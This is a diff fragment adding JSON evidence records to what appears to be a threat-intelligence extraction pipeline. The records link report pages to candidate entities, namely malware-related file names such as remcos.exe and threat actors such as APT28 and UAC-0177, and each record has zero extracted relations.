+    {
+      "evidence_id": "ev_12",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_file_explorer.exe",
+        "ent_file_GB.exe",
+        "ent_file_wsuscr.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_4",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_file_explorer.exe",
+        "ent_file_GB.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_10",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT28",
+        "ent_threatactor_UAC-0177",
+        "ent_threatactor_JokerDPR"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_13",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_file_Documents.zip",
+        "ent_file_Request.exe",
+        "ent_file_Request.rar"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_21",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_file_powershell.exe",
+        "ent_file_test2.exe",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_6",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_file_Documents.zip",
+        "ent_file_Request.rar"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_11",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_file_debt.rar",
+        "ent_file_Subscriber_Debt.doc"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_23",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_file_remcos.exe",
+        "ent_file_wsuscr.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
